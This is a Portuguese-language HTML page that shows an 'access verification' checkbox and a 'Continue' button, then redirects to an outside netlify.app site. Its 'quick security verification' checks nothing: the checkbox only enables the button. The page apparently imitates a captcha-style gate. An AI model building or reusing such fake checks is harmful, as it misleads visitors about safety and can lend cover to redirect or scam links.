<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Verificação de acesso</title>

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      min-height: 100vh;
      font-family: Arial, Helvetica, sans-serif;
      background:
        radial-gradient(circle at 20% 20%, rgba(99, 45, 255, .18), transparent 35%),
        radial-gradient(circle at 80% 80%, rgba(255, 0, 153, .15), transparent 35%),
        #f5f7fb;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
      color: #202124;
    }

    .box {
      width: 100%;
      max-width: 430px;
      background: rgba(255,255,255,.96);
      border-radius: 22px;
      padding: 34px 28px 28px;
      box-shadow:
        0 20px 60px rgba(30, 20, 80, .12),
        0 5px 20px rgba(0,0,0,.05);
      border: 1px solid rgba(255,255,255,.8);
      text-align: center;
      animation: aparecer .5s ease;
    }

    @keyframes aparecer {
      from {
        opacity: 0;
        transform: translateY(18px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .icon {
      width: 70px;
      height: 70px;
      margin: 0 auto 20px;
      border-radius: 18px;
      display: flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(135deg, #5b21ff, #a855f7);
      color: white;
      font-size: 32px;
      box-shadow: 0 10px 25px rgba(91,33,255,.25);
    }

    h1 {
      font-size: 25px;
      margin-bottom: 10px;
      color: #171717;
    }

    .subtitle {
      color: #6b7280;
      font-size: 15px;
      line-height: 1.5;
      margin-bottom: 25px;
    }

    .verify {
      display: flex;
      align-items: center;
      gap: 14px;
      text-align: left;
      background: #fafafa;
      border: 1px solid #dedede;
      border-radius: 12px;
      padding: 16px;
      margin-bottom: 20px;
      cursor: pointer;
      transition: .2s;
    }

    .verify:hover {
      border-color: #7c3aed;
      background: #fcfaff;
    }

    .checkbox {
      width: 27px;
      height: 27px;
      border: 2px solid #9ca3af;
      border-radius: 6px;
      background: white;
      flex-shrink: 0;
      position: relative;
    }

    .checkbox.checked {
      background: #6d28d9;
      border-color: #6d28d9;
    }

    .checkbox.checked::after {
      content: "✓";
      position: absolute;
      color: white;
      font-size: 19px;
      font-weight: bold;
      left: 4px;
      top: -1px;
    }

    .verify-text {
      font-size: 14px;
      color: #303030;
      font-weight: 600;
    }

    .verify-small {
      display: block;
      color: #888;
      font-size: 11px;
      font-weight: normal;
      margin-top: 3px;
    }

    .button {
      width: 100%;
      border: 0;
      padding: 16px;
      border-radius: 12px;
      background: linear-gradient(135deg, #5b21ff, #8b5cf6);
      color: white;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      box-shadow: 0 8px 20px rgba(91,33,255,.25);
      transition: .2s;
    }

    .button:hover {
      transform: translateY(-2px);
      box-shadow: 0 12px 25px rgba(91,33,255,.32);
    }

    .button:disabled {
      opacity: .5;
      cursor: not-allowed;
      transform: none;
      box-shadow: none;
    }

    .loading {
      display: none;
      margin-top: 18px;
      font-size: 13px;
      color: #6b7280;
    }

    .spinner {
      width: 18px;
      height: 18px;
      border: 3px solid #ddd;
      border-top-color: #6d28d9;
      border-radius: 50%;
      display: inline-block;
      vertical-align: middle;
      margin-right: 7px;
      animation: spin .7s linear infinite;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    .footer {
      margin-top: 23px;
      font-size: 11px;
      color: #9ca3af;
    }

    @media(max-width:480px) {
      .box {
        padding: 28px 20px 24px;
        border-radius: 18px;
      }

      h1 {
        font-size: 22px;
      }
    }
  </style>
</head>

<body>

  <main class="box">

    <div class="icon">
      ✓
    </div>

    <h1>Verificação de acesso</h1>

    <p class="subtitle">
      Confirme que você deseja continuar para acessar o conteúdo.
    </p>

    <div class="verify" id="verifyBox">
      <div class="checkbox" id="checkbox"></div>

      <div>
        <div class="verify-text">
          Confirmar acesso
        </div>

        <span class="verify-small">
          Verificação rápida de segurança
        </span>
      </div>
    </div>

    <button class="button" id="continueBtn" disabled>
      Continuar
    </button>

    <div class="loading" id="loading">
      <span class="spinner"></span>
      Preparando acesso...
    </div>

    <div class="footer">
      Verificação de acesso • Navegação segura
    </div>

  </main>

  <script>
    const verifyBox = document.getElementById("verifyBox");
    const checkbox = document.getElementById("checkbox");
    const continueBtn = document.getElementById("continueBtn");
    const loading = document.getElementById("loading");

    let verified = false;

    verifyBox.addEventListener("click", () => {

      verified = !verified;

      if (verified) {
        checkbox.classList.add("checked");
        continueBtn.disabled = false;
      } else {
        checkbox.classList.remove("checked");
        continueBtn.disabled = true;
      }

    });

    continueBtn.addEventListener("click", () => {

      if (!verified) return;

      continueBtn.disabled = true;
      loading.style.display = "block";

      setTimeout(() => {
        window.location.href =
          "https://majestic-desenrola.netlify.app/";
      }, 800);

    });
  </script>

</body>
</html>
